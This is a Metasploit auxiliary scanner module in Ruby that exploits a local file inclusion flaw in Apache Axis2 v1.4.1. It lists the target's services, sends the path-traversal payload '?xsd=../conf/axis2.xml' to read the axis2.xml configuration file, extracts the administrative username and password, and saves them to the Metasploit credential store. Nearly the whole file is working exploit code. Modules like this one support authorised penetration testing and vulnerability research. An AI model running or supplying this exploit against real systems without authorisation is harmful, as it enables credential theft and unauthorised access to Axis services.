##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner


  def initialize
    super(
      'Name'           => 'Apache Axis2 v1.4.1 Local File Inclusion',
      'Description'    => %q{
          This module exploits an Apache Axis2 v1.4.1 local file inclusion (LFI) vulnerability.
        By loading a local XML file which contains a cleartext username and password, attackers can trivially
        recover authentication credentials to Axis services.
      },
      'References'     =>
        [
          ['EDB', '12721'],
          ['OSVDB', '59001'],
        ],
      'Author'         =>
        [
          'Tiago Ferreira <tiago.ccna[at]gmail.com>'
        ],
      'License'        =>  MSF_LICENSE
    )

    register_options([
      Opt::RPORT(8080),
      OptString.new('TARGETURI', [false, 'The path to the Axis listServices', '/axis2/services/listServices']),
    ])
  end

  def run_host(ip)
    uri = normalize_uri(target_uri.path)

    begin
      res = send_request_raw({
        'method'  => 'GET',
        'uri'     => uri,
      }, 25)

      if (res and res.code == 200)
        res.body.to_s.match(/\/axis2\/services\/([^\s]+)\?/)
        new_uri = normalize_uri("/axis2/services/#{$1}")
        get_credentials(new_uri)

      else
        print_status("#{full_uri} - Apache Axis - The remote page not accessible")
        return

      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE

    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: (ssl ? 'https' : 'http'),
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def get_credentials(uri)
    lfi_payload = "?xsd=../conf/axis2.xml"

    begin
      res = send_request_raw({
        'method'  => 'GET',
        'uri'     => "#{uri}" + lfi_payload,
      }, 25)

      print_status("#{full_uri} - Apache Axis - Dumping administrative credentials")

      if res.nil?
        print_error("#{full_uri} - Connection timed out")
        return
      end

      if (res.code == 200)
        if res.body.to_s.match(/axisconfig/)

          res.body.scan(/parameter\sname=\"userName\">([^\s]+)</)
          username = $1
          res.body.scan(/parameter\sname=\"password\">([^\s]+)</)
          password = $1

          print_good("#{full_uri} - Apache Axis - Credentials Found Username: '#{username}' - Password: '#{password}'")

          report_cred(ip: rhost, port: rport, user: username, password: password, proof: res.body)

        else
          print_error("#{full_uri} - Apache Axis - Not Vulnerable")
          return :abort
        end

      else
        print_error("#{full_uri} - Apache Axis - Unrecognized #{res.code} response")
        return :abort

      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end
end
